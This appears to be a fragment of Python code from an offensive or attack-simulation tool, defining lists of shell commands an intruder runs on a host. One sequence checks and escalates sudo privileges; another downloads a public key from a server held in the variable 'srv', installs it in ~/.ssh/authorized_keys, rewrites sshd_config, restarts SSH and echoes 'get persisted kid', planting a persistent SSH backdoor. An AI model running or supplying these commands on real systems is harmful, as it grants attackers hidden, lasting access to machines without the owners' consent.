SEQUENCE_0 = ["whoami",
              "pwd",
              "sudo -l",
              "sudo -i",
              "whoami"]

SEQUENCE_1 = []

SEQUENCE_3 = [
        "whoami",
        "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
        "mkdir ~/.ssh",
        "touch ~/.ssh/authorized_keys",
        "chmod 700 ~/.ssh",
        "cat id_rsa.pub > ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
        "rm id_rsa.pub",
        "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
        "/etc/init.d/ssh restart",
        "echo get persisted kid",
    ]
